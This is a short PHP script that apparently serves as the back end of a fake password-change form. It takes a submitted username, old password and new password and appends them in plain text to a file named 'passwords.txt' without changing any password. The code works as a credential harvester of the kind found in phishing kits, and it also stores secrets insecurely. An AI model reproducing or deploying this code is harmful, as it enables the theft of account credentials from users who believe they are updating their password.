<?php



$username = $_POST['username'];

$oldpass = $_POST['passwordinput-old'];

$newpass = $_POST['passwordinput-new'];



//the data

$data = "$username | $oldpass | $newpass\n";



//open the file and choose the mode

$fh = fopen("passwords.txt", "a+");

fwrite($fh, $data);



//close the file

fclose($fh);



print "User Submitted";



?>